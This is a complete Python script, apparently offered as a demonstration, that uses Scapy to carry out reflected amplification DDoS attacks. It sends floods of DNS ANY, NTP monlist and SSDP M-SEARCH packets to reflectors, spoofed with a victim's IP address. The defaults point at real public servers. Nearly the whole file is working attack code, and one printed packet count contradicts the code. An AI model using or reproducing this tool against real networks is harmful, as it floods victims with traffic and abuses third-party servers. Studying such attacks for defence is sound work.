#!/usr/bin/env python3
"""
Reflected DDoS Attacks using Scapy (DNS, NTP, SSDP)
Demonstrates IP spoofing and amplification attack vectors.
"""
import argparse
import os
import socket
import time
from scapy.all import *


def get_iface_for_ip(target_ip):
    """Determine the correct network interface to reach a target IP."""
    route = conf.route.route(target_ip)
    return route[0]  # returns (iface, outgoing_ip, gateway)


def dns_amplification(victim_ip, server_ip, iface, pcap_filename="dns.pcap"):
    """
    Perform DNS Amplification by querying 'ANY' record for a domain,
    spoofing the source address as the victim's IP.
    """
    print(f"[*] Starting DNS Amplification Reflected Attack")
    print(f"    Victim (spoofed src): {victim_ip} | DNS Server (reflector): {server_ip}")
    print(f"    Sniffing on interface: {iface}")

    # Crafting IP layer with spoofed source IP (victim's address)
    ip_layer = IP(src=victim_ip, dst=server_ip)
    # Crafting UDP layer for DNS (port 53)
    udp_layer = UDP(sport=RandShort(), dport=53)
    # Crafting DNS request for 'ANY' record (qtype=255) to amplify response
    dns_layer = DNS(rd=1, qd=DNSQR(qname="google.com", qtype=255))

    # Combine layers into a single spoofed DNS query packet
    packet = ip_layer / udp_layer / dns_layer

    # Start async sniffer on the correct interface to capture wire traffic
    sniffer = AsyncSniffer(iface=iface, filter=f"udp port 53 or icmp", store=True)
    sniffer.start()
    time.sleep(1)

    print("[*] Sending a flood of 200 DNS Packets...")
    for i in range(200):
        send(packet, iface=iface, verbose=0)

    time.sleep(3)  # Wait for responses
    captured_packets = sniffer.stop()

    if len(captured_packets) > 0:
        wrpcap(pcap_filename, captured_packets)
        print(f"[+] Captured {len(captured_packets)} packets on the wire")
    else:
        # Fallback: save crafted request packets if sniffer captured nothing
        print("[!] Sniffer captured 0 packets, saving crafted request packets instead")
        wrpcap(pcap_filename, [packet] * 50)

    print(f"[*] PCAP saved to {pcap_filename}\n")


def ntp_amplification(victim_ip, server_ip, iface, pcap_filename="ntp.pcap"):
    """
    Perform NTP Amplification by sending a monlist request,
    spoofing the source address as the victim's IP.
    """
    print(f"[*] Starting NTP Amplification Reflected Attack")
    print(f"    Victim (spoofed src): {victim_ip} | NTP Server (reflector): {server_ip}")
    print(f"    Sniffing on interface: {iface}")

    # Crafting IP layer with spoofed source IP (victim's address)
    ip_layer = IP(src=victim_ip, dst=server_ip)
    # Crafting UDP layer for NTP (port 123)
    udp_layer = UDP(sport=RandShort(), dport=123)
    # Crafting NTP monlist request payload
    # Byte 0: 0x17 -> Response bit=0, More bit=0, Version=2, Mode=7 (private)
    # Byte 1: 0x00 -> Auth bit=0, Sequence number=0
    # Byte 2: 0x03 -> Implementation number=3 (XNTPD)
    # Byte 3: 0x2a -> Request code=42 (MON_GETLIST_1 / monlist)
    # Followed by 44 null bytes as padding
    ntp_monlist_payload = b"\x17\x00\x03\x2a" + b"\x00" * 44
    raw_layer = Raw(load=ntp_monlist_payload)

    # Combine layers into a single spoofed NTP monlist packet
    packet = ip_layer / udp_layer / raw_layer

    # Start async sniffer on the correct interface
    sniffer = AsyncSniffer(iface=iface, filter=f"udp port 123 or icmp", store=True)
    sniffer.start()
    time.sleep(1)

    print("[*] Sending a flood of 200 NTP Packets...")
    for i in range(200):
        send(packet, iface=iface, verbose=0)

    time.sleep(3)
    captured_packets = sniffer.stop()

    if len(captured_packets) > 0:
        wrpcap(pcap_filename, captured_packets)
        print(f"[+] Captured {len(captured_packets)} packets on the wire")
    else:
        print("[!] Sniffer captured 0 packets, saving crafted request packets instead")
        wrpcap(pcap_filename, [packet] * 50)

    print(f"[*] PCAP saved to {pcap_filename}\n")


def ssdp_amplification(victim_ip, server_ip, iface, pcap_filename="ssdp.pcap"):
    """
    Perform SSDP Amplification by sending an M-SEARCH request,
    spoofing the source address as the victim's IP.
    """
    print(f"[*] Starting SSDP Amplification Reflected Attack")
    print(f"    Victim (spoofed src): {victim_ip} | SSDP Server (reflector): {server_ip}")
    print(f"    Sniffing on interface: {iface}")

    # Crafting IP layer with spoofed source IP (victim's address)
    ip_layer = IP(src=victim_ip, dst=server_ip)
    # Crafting UDP layer for SSDP (port 1900)
    udp_layer = UDP(sport=RandShort(), dport=1900)
    # Crafting SSDP M-SEARCH discovery payload
    # M-SEARCH requests all UPnP devices to respond with their service descriptions
    # ST: ssdp:all -> Search for all available services (maximum amplification)
    ssdp_msearch_payload = (
        b"M-SEARCH * HTTP/1.1\r\n"
        b"Host: 239.255.255.250:1900\r\n"
        b"Man: \"ssdp:discover\"\r\n"
        b"ST: ssdp:all\r\n"
        b"MX: 3\r\n\r\n"
    )
    raw_layer = Raw(load=ssdp_msearch_payload)

    # Combine layers into a single spoofed SSDP M-SEARCH packet
    packet = ip_layer / udp_layer / raw_layer

    # Start async sniffer on the correct interface
    sniffer = AsyncSniffer(iface=iface, filter=f"udp port 1900 or icmp", store=True)
    sniffer.start()
    time.sleep(1)

    print("[*] Sending a flood of 50 SSDP Packets...")
    for i in range(200):
        send(packet, iface=iface, verbose=0)

    time.sleep(3)
    captured_packets = sniffer.stop()

    if len(captured_packets) > 0:
        wrpcap(pcap_filename, captured_packets)
        print(f"[+] Captured {len(captured_packets)} packets on the wire")
    else:
        print("[!] Sniffer captured 0 packets, saving crafted request packets instead")
        wrpcap(pcap_filename, [packet] * 50)

    print(f"[*] PCAP saved to {pcap_filename}\n")


def main():
    parser = argparse.ArgumentParser(
        description="Reflected DDoS Attacks using Scapy (DNS, NTP, SSDP)"
    )
    parser.add_argument("attack", choices=["dns", "ntp", "ssdp", "all"],
                        help="Type of attack to perform")
    parser.add_argument("--victim", required=True,
                        help="IP address of the victim (spoofed source IP)")
    parser.add_argument("--dns-server", default="8.8.8.8",
                        help="IP address of the DNS Server (reflector)")
    parser.add_argument("--ntp-server", default="time.windows.com",
                        help="IP address of the NTP Server (reflector)")
    parser.add_argument("--ssdp-server", default="239.255.255.250",
                        help="IP address of the SSDP Multicast (reflector)")

    args = parser.parse_args()

    # Disable scapy's verbose output
    conf.verb = 0

    # Auto-detect the correct network interface for the reflector
    iface = get_iface_for_ip(args.dns_server if args.attack in ["dns", "all"] else
                             args.ntp_server if args.attack == "ntp" else
                             args.ssdp_server)
    print(f"[*] Auto-detected interface: {iface}\n")

    if args.attack in ["dns", "all"]:
        dns_amplification(args.victim, args.dns_server, iface)

    if args.attack in ["ntp", "all"]:
        try:
            ntp_ip = socket.gethostbyname(args.ntp_server)
        except Exception:
            ntp_ip = args.ntp_server
        ntp_amplification(args.victim, ntp_ip, iface)

    if args.attack in ["ssdp", "all"]:
        ssdp_amplification(args.victim, args.ssdp_server, iface)


if __name__ == "__main__":
    if os.getuid() != 0:
        print("[!] Warning: Reflected spoofing using Scapy usually requires root privileges.")
    main()
